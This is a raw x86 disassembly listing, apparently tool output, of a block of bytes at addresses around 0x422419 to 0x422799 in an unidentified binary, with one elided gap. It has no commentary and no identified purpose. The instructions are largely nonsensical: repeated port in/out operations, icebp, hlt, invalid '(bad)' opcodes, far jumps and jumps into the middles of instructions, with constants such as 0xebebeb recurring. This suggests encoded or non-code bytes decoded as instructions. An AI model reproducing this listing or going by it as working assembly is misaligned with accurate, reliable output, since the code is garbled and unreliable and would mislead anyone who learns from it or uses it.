  422419:	add    DWORD PTR [esi+eiz*8-0x7e8a1415],0xebebeb18
  422424:	ja     0x422497
  422426:	sbb    bl,ch
  422428:	jmp    0x422415
  42242a:	ja     0x4224a5
  42242c:	test   dh,ah
  42242e:	jmp    0x42241b
  422430:	out    dx,eax
  422431:	xor    al,0x28
  422433:	jne    0x4224ae
  422435:	fs call 0x81ba1026
  42243b:	fs call 0xaeb0102c
  422441:	in     al,0xec
  422443:	in     al,dx
  422444:	in     al,dx
  422445:	jne    0x4223c8
  422447:	xor    al,0xe6
  422449:	jmp    0x422436
  42244b:	ja     0x4224be
  42244d:	xor    al,0xe6
  42244f:	jmp    0x42243c
  422451:	ja     0x4224cc
  422453:	test   dh,ah
  422455:	jmp    0x422442
  422457:	out    dx,eax
  422458:	xor    al,0xf8
  42245a:	jne    0x4224d5
  42245c:	cmp    al,0xe6
  42245e:	jmp    0x42244b
  422460:	ja     0x4223e3
  422462:	xor    al,0xe6
  422464:	jmp    0x422451
  422466:	ja     0x4224d9
  422468:	cmp    al,0xe6
  42246a:	jmp    0x422457
  42246c:	out    dx,eax
  42246d:	cs hlt 
  42246f:	jne    0x4224e2
  422471:	sub    dh,ah
  422473:	jmp    0x422460
  422475:	mov    bl,0x71
  422477:	xor    dh,ah
  422479:	jmp    0x422466
  42247b:	in     al,dx
  42247c:	in     al,dx
  42247d:	in     al,dx
  42247e:	in     al,dx
  42247f:	mov    bl,0x71
  422481:	cmp    dh,ah
  422483:	jmp    0x422470
  422485:	in     al,dx
  422486:	in     al,dx
  422487:	in     al,dx
  422488:	in     al,dx
  422489:	mov    bl,0x71
  42248b:	sub    al,0xe6
  42248d:	jmp    0x42247a
  42248f:	in     al,dx
  422490:	in     al,dx
  422491:	in     al,dx
  422492:	in     al,dx
  422493:	ja     0x42250e
  422495:	cmp    al,0xe6
  422497:	jmp    0x422484
  422499:	daa    
  42249a:	jns    0x4224c4
  42249c:	out    0xeb,al
  42249e:	jmp    0x42249b
  4224a0:	outs   dx,DWORD PTR ds:[esi]
  4224a1:	scas   al,BYTE PTR es:[edi]
  4224a2:	out    dx,al
  4224a3:	in     al,dx
  4224a4:	in     al,dx
  4224a5:	outs   dx,DWORD PTR ds:[esi]
  4224a6:	test   eax,0xebebe62c
  4224ab:	in     al,dx
  4224ac:	sti    
  4224ad:	jno    0x422450
  4224af:	out    dx,al
  4224b0:	in     al,dx
  4224b1:	in     al,dx
  4224b2:	ja     0x422435
  4224b4:	cmp    al,0xe6
  4224b6:	jmp    0x4224a3
  4224b8:	sti    
  4224b9:	mov    ds:0xecd429ee,al
  4224be:	in     al,dx
  4224bf:	in     al,dx
  4224c0:	sti    
  4224c1:	jno    0x42253c
  4224c3:	out    dx,al
  4224c4:	in     al,dx
  4224c5:	in     al,dx
  4224c6:	ja     0x422541
  4224c8:	cmp    al,0xe6
  4224ca:	jmp    0x4224b7
  4224cc:	outs   dx,DWORD PTR ds:[esi]
  4224cd:	lods   eax,DWORD PTR ds:[esi]
  4224ce:	in     eax,dx
  4224cf:	jne    0x42254a
  4224d1:	cmp    al,0xe6
  4224d3:	jmp    0x4224c0
  4224d5:	ja     0x422458
  4224d7:	cmp    al,0xe6
  4224d9:	jmp    0x4224c6
  4224db:	ja     0x4224cb
  4224dd:	jne    0x422550
  4224df:	xor    dh,ah
  4224e1:	jmp    0x4224ce
  4224e3:	ja     0x42255e
  4224e5:	cmp    al,0xe6
  4224e7:	jmp    0x4224d4
  4224e9:	outs   dx,DWORD PTR ds:[esi]
  4224ea:	lods   eax,DWORD PTR ds:[esi]
  4224eb:	lock jne 0x422567
  4224ee:	cmp    al,0xe6
  4224f0:	jmp    0x4224dd
  4224f2:	ja     0x422475
  4224f4:	cmp    al,0xe6
  4224f6:	jmp    0x4224e3
  4224f8:	out    dx,eax
  4224f9:	xor    DWORD PTR [eax],0x27ebebe6
  4224ff:	add    DWORD PTR [ebx+ebp*8-0x15],0x3571fbeb
  422507:	out    dx,al
  422508:	in     al,dx
  422509:	in     al,dx
  42250a:	mov    bl,0x71
  42250c:	xor    dh,ah
  42250e:	jmp    0x4224fb
  422510:	in     al,dx
  422511:	in     al,dx
  422512:	in     al,dx
  422513:	in     al,dx
  422514:	ja     0x422587
  422516:	cmp    al,0xe6
  422518:	jmp    0x422505
  42251a:	jne    0x42258d
  42251c:	and    dh,ah
  42251e:	jmp    0x42250b
  422520:	mov    bl,0x71
  422522:	sbb    al,0xe6
  422524:	jmp    0x422511
  422526:	in     al,dx
  422527:	in     al,dx
  422528:	in     al,dx
  422529:	in     al,dx
  42252a:	xlat   BYTE PTR ds:[ebx]
  42252b:	sti    
  42252c:	ja     0x4225a7
  42252e:	sbb    al,0xe6
  422530:	jmp    0x42251d
  422532:	outs   dx,DWORD PTR ds:[esi]
  422533:	lods   eax,DWORD PTR ds:[esi]
  422534:	in     eax,dx
  422535:	jne    0x4225b0
  422537:	sbb    al,0xe6
  422539:	jmp    0x422526
  42253b:	outs   dx,DWORD PTR ds:[esi]
  42253c:	test   eax,0xebebe61c
  422541:	or     al,0xfb
  422543:	outs   dx,DWORD PTR ds:[esi]
  422544:	jmp    0x422533
  422546:	in     al,dx
  422547:	in     al,dx
  422548:	outs   dx,DWORD PTR ds:[esi]
  422549:	test   eax,0xebebe62c
  42254e:	in     al,dx
  42254f:	sti    
  422550:	jno    0x422530
  422552:	in     eax,dx
  422553:	in     al,dx
  422554:	in     al,dx
  422555:	ja     0x4224d8
  422557:	cmp    al,0xe6
  422559:	jmp    0x422546
  42255b:	outs   dx,DWORD PTR ds:[esi]
  42255c:	(bad)  
  42255d:	in     eax,dx
  42255e:	jne    0x4224e1
  422560:	cmp    al,0xe6
  422562:	jmp    0x42254f
  422564:	ja     0x4225d7
  422566:	cmp    al,0xe6
  422568:	jmp    0x422555
  42256a:	push   edx
  42256b:	ja     0x422561
  42256d:	push   edx
  42256e:	jne    0x4225e9
  422570:	and    al,0xe6
  422572:	jmp    0x42255f
  422574:	sti    
  422575:	mov    ds:0xebe62481,eax
  42257a:	jmp    0x4225e9
  42257c:	out    0x56,al
  42257e:	cmc    
  42257f:	in     al,dx
  422580:	in     al,dx
  422581:	sti    
  422582:	jno    0x42252b
  422584:	in     eax,dx
  422585:	in     al,dx
  422586:	in     al,dx
  422587:	ja     0x4225fa
  422589:	cmp    al,0xe6
  42258b:	jmp    0x422578
  42258d:	jne    0x422600
  42258f:	sbb    dh,ah
  422591:	jmp    0x42257e
  422593:	ja     0x42260e
  422595:	cmp    dh,ah
  422597:	jmp    0x422584
  422599:	outs   dx,DWORD PTR ds:[esi]
  42259a:	lods   eax,DWORD PTR ds:[esi]
  42259b:	in     eax,dx
  42259c:	jne    0x422617
  42259e:	cmp    dh,ah
  4225a0:	jmp    0x42258d
  4225a2:	outs   dx,DWORD PTR ds:[esi]
  4225a3:	test   eax,0xebebe7c0
  4225a8:	icebp  
  4225a9:	pop    esi
  4225aa:	add    DWORD PTR [edi-0x57],ebp
  4225ad:	(bad)  
  4225ae:	out    0xeb,eax
  4225b0:	jmp    0x42259f
  4225b2:	pop    esi
  4225b3:	clc    
  4225b4:	sti    
  4225b5:	mov    ds:0xebe85081,eax
  4225ba:	jmp    0x42262b
  4225bc:	out    0xed,al
  4225be:	imul   edi,ecx,0x6f
  4225c1:	test   eax,0xebebe7c0
  4225c6:	icebp  
  4225c7:	sti    
  4225c8:	jb     0x4225db
  4225ca:	in     eax,dx
  4225cb:	in     al,dx
  4225cc:	in     al,dx
  4225cd:	outs   dx,DWORD PTR ds:[esi]
  4225ce:	test   eax,0xebebe7c0
  4225d3:	icebp  
  4225d4:	popa   
  4225d5:	cmc    
  4225d6:	outs   dx,DWORD PTR ds:[esi]
  4225d7:	test   eax,0xebebe7c4
  4225dc:	out    dx,al
  4225dd:	pusha  
  4225de:	imul   ebp,DWORD PTR [edi-0x57],0xebebe638
  4225e5:	out    dx,al
  4225e6:	pusha  
  4225e7:	(bad)  
  4225e8:	outs   dx,DWORD PTR ds:[esi]
  4225e9:	test   eax,0xebebe7c0
  4225ee:	icebp  
  4225ef:	popa   
  4225f0:	push   edx
  4225f1:	outs   dx,DWORD PTR ds:[esi]
  4225f2:	test   eax,0xebebe638
  4225f7:	in     eax,dx
  4225f8:	popa   
  4225f9:	dec    ecx
  4225fa:	mov    bl,0x71
  4225fc:	adc    al,0xe6
  4225fe:	jmp    0x4225eb
  422600:	in     al,dx
  422601:	in     al,dx
  422602:	in     al,dx
  422603:	in     al,dx
  422604:	ja     0x422677
  422606:	sbb    dh,ah
  422608:	jmp    0x4225f5
  42260a:	sti    
  42260b:	mov    ds:0x7ce56df4,al
  422610:	in     al,dx
  422611:	in     al,dx
  422612:	in     al,dx
  422613:	popa   
  422614:	sti    
  422615:	ja     0x422598
  422617:	adc    al,0xe6
  422619:	jmp    0x422606
  42261b:	outs   dx,DWORD PTR ds:[esi]
  42261c:	scas   al,BYTE PTR es:[edi]
  42261d:	in     eax,dx
  42261e:	jne    0x4225a1
  422620:	adc    al,0xe6
  422622:	jmp    0x42260f
  422624:	ja     0x422697
  422626:	sbb    dh,ah
  422628:	jmp    0x422615
  42262a:	outs   dx,DWORD PTR ds:[esi]
  42262b:	aam    0xed
  42262d:	jne    0x4226a0
  42262f:	sbb    dh,ah
  422631:	jmp    0x42261e
  422633:	outs   dx,DWORD PTR ds:[esi]
  422634:	test   eax,0xebebe614
  422639:	lock pop esi
  42263b:	mov    ah,0x6f
  42263d:	test   eax,0xebebe614
  422642:	lock popa 
  422644:	(bad)  
  422645:	ja     0x4226c0
  422647:	sbb    dh,ah
  422649:	jmp    0x422636
  42264b:	jmp    0x42260a
  42264d:	mov    bl,0x71
  42264f:	sub    al,0xe6
  422651:	jmp    0x42263e
  422653:	in     eax,dx
  422654:	in     al,dx
  422655:	in     al,dx
  422656:	in     al,dx
  422657:	aad    0x80
  422659:	in     al,dx
  42265a:	in     al,dx
  42265b:	in     al,dx
  42265c:	mov    bl,0x71
  42265e:	adc    dh,ah
  422660:	jmp    0x42264d
  422662:	in     al,dx
  422663:	in     al,dx
  422664:	in     al,dx
  422665:	in     al,dx
  422666:	ja     0x4226e1
  422668:	sbb    dh,ah
  42266a:	jmp    0x422657
  42266c:	sti    
  42266d:	mov    ds:0x7ce66dfd,al
  422672:	in     al,dx
  422673:	in     al,dx
  422674:	in     al,dx
  422675:	popa   
  422676:	sti    
  422677:	ja     0x4226ea
  422679:	adc    dh,ah
  42267b:	jmp    0x422668
  42267d:	outs   dx,DWORD PTR ds:[esi]
  42267e:	lods   al,BYTE PTR ds:[esi]
  42267f:	in     eax,dx
  422680:	jne    0x4226f3
  422682:	adc    dh,ah
  422684:	jmp    0x422671
  422686:	ja     0x422701
  422688:	sbb    dh,ah
  42268a:	jmp    0x422677
  42268c:	outs   dx,DWORD PTR ds:[esi]
  42268d:	aad    0xed
  42268f:	jne    0x42270a
  422691:	sbb    dh,ah
  422693:	jmp    0x422680
  422695:	outs   dx,DWORD PTR ds:[esi]
  422696:	test   eax,0xebebe610
  42269b:	lock pop esi
  42269d:	mov    ah,0x6f
  42269f:	test   eax,0xebebe610
  4226a4:	lock popa 
  4226a6:	xor    eax,0xd9aadba4
  4226ab:	jmp    0xebeb:0xe6187177
  4226b2:	ja     0x422635
  4226b4:	sbb    dh,ah
  4226b6:	jmp    0x4226a3
  4226b8:	sti    
  4226b9:	mov    ds:0x7729f12e,al
  4226be:	in     al,dx
  4226bf:	in     al,dx
  4226c0:	in     al,dx
  4226c1:	popa   
  4226c2:	sbb    DWORD PTR [edi+0x79],esi
  4226c5:	sbb    dh,ah
  4226c7:	jmp    0x4226b4
  4226c9:	sti    
  4226ca:	mov    ds:0xe66df23d,al
  4226cf:	jmp    0x4226bd
  4226d1:	in     al,dx
  4226d2:	in     al,dx
  4226d3:	popa   
  4226d4:	pop    es
  4226d5:	outs   dx,DWORD PTR ds:[esi]
  4226d6:	test   eax,0xebebe610
  4226db:	lock popa 
  4226dd:	(bad)  
  4226de:	ja     0x422759
  4226e0:	sbb    dh,ah
  4226e2:	jmp    0x4226cf
  4226e4:	jmp    0x4226a3
  4226e6:	mov    bl,0x71
  4226e8:	sub    al,0xe6
  4226ea:	jmp    0x4226d7
  4226ec:	in     eax,dx
  4226ed:	in     al,dx
  4226ee:	in     al,dx
  4226ef:	in     al,dx
  4226f0:	xlat   BYTE PTR ds:[ebx]
  4226f1:	cmp    al,0xb3
  4226f3:	jno    0x422701
  4226f5:	out    0xeb,al
  4226f7:	jmp    0x422736
  4226f9:	cmp    eax,0x71b3413f
  4226fe:	sub    al,0xe6
  422700:	jmp    0x4226ed
  422702:	in     al,dx
  422703:	in     al,dx
  422704:	in     al,dx
  422705:	in     al,dx
  422706:	ja     0x422779
  422708:	sbb    dh,ah
  42270a:	jmp    0x4226f7
  42270c:	ja     0x422787
  42270e:	or     al,0xe6
  422710:	jmp    0x4226fd
  422712:	daa    
  422713:	hlt    
  422714:	popa   
  422715:	clc    
  422716:	mov    bl,0x71
  422718:	sub    al,0xe6
  42271a:	jmp    0x422707
  42271c:	in     eax,dx
  42271d:	in     al,dx
  42271e:	in     al,dx
  42271f:	in     al,dx
  422720:	xlat   BYTE PTR ds:[ebx]
  422721:	sti    
  422722:	ja     0x4226a5
  422724:	sbb    dh,ah
  422726:	jmp    0x422713
  422728:	outs   dx,DWORD PTR ds:[esi]
  422729:	(bad)  
  42272a:	in     eax,dx
  42272b:	jne    0x4226ae
  42272d:	sbb    dh,ah
  42272f:	jmp    0x42271c
  422731:	outs   dx,DWORD PTR ds:[esi]
  422732:	test   eax,0xebebe62c
  422737:	in     al,dx
  422738:	pusha  
  422739:	mov    eax,0xe6187977
  42273e:	jmp    0x42272b
  422740:	jmp    0x4226ff
  422742:	aad    0xd1
  422744:	jmp    0x71ba1334
  422749:	and    dh,ah
  42274b:	jmp    0x422738
  42274d:	jne    0x4227c0
  42274f:	cmp    al,0xe6
  422751:	jmp    0x42273e
  422753:	ja     0x4227ce
  422755:	cmp    al,0xe6
  422757:	jmp    0x422744
  422759:	outs   dx,DWORD PTR ds:[esi]
  42275a:	lods   eax,DWORD PTR ds:[esi]
  42275b:	in     eax,dx
  42275c:	jne    0x4227d7
  42275e:	cmp    al,0xe6
  422760:	jmp    0x42274d
  422762:	aad    0x18
  422764:	jmp    0x74971354
  422769:	(bad)  
  42276a:	in     al,dx
  42276b:	in     al,dx
  42276c:	jmp    0x4227af
  42276e:	in     al,0x77
  422770:	sbb    DWORD PTR [ebx+ebp*8],0xb077ebeb
  422777:	push   edx
  422778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422779:	js     0x422766
  42277b:	ja     0x422749
  42277d:	jmp    0x42274d
  42277f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422780:	in     al,dx
  422781:	in     al,dx
  422782:	in     al,dx
  422783:	in     al,dx
  422784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422785:	in     al,dx
  422786:	in     al,dx
  422787:	in     al,dx
  422788:	in     al,dx
  422789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42278a:	in     al,dx
  42278b:	in     al,dx
  42278c:	in     al,dx
  42278d:	in     al,dx
  42278e:	pop    ds
  42278f:	lods   al,BYTE PTR ds:[esi]
  422790:	ja     0x422763
  422792:	dec    ecx
  422793:	scas   al,BYTE PTR es:[edi]
  422794:	hlt    
  422795:	in     al,dx
  422796:	inc    ecx
  422797:	ja     0x422771
  422799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  425642:	add    BYTE PTR [eax],al
  425644:	xor    esi,DWORD PTR [eax+eax*1]
